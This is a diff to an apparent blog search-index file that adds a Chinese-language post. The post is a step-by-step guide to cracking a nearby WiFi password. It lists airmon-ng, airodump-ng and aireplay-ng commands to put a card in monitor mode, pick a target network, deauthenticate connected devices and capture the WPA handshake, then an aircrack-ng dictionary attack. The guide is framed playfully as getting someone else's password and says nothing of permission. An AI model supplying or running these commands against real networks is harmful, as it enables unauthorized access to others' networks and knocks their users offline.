@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>芝士甚么?WIFI密码!</title>
+      <link href="/2026/07/07/%E8%8A%9D%E5%A3%AB%E7%94%9A%E4%B9%88-WIFI%E5%AF%86%E7%A0%81/"/>
+      <url>/2026/07/07/%E8%8A%9D%E5%A3%AB%E7%94%9A%E4%B9%88-WIFI%E5%AF%86%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<h1 id="芝士甚么？让俺看看你的密码！"><a href="#芝士甚么？让俺看看你的密码！" class="headerlink" title="芝士甚么？让俺看看你的密码！"></a>芝士甚么？让俺看看你的密码！</h1><p>扎上你的网卡<br><code>airmon-ng start wlan0</code> 开启监听模式<br><code>airodump-ng wlan0mon</code> 扫描附近网络，找到目标<br>锁定目标mac地址，开始抓取握手包<br><code>airodump-ng -c 6 --bssid mac地址 -w 抓包存储的路径（如home） wlan0mon</code>  (-c后面的数字是信道，即“CH”)<br>再打开一个终端<br><code>aireplay-ng --deauth 1000 -a mac地址 wlan0mon</code> 或者 <code>aireplay-ng -0 0 -c 连接到wifi的手机mac地址 -a mac地址 wlan0mon</code> <em>（把设备踹下线）</em><br>抓取握手包的终端出现<strong>WPA handshake</strong>时，表示抓包成功<br>两边终端都<code>ctrl+c</code>停止，结束攻击<br>then：  </p><ol><li>把握手包导入跑包软件（比如wifipr）</li><li>aircrack-ng -w 字典路径 握手包路径     回车后开始跑字典<br>然后耐心等待结果sa~</li></ol><p><del><em><strong>a，对了，复杂密码可能耗时巨大或者跑不出来sa.</strong></em></del>    </p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hello World</title>
       <link href="/2026/04/10/hello-world/"/>
       <url>/2026/04/10/hello-world/</url>
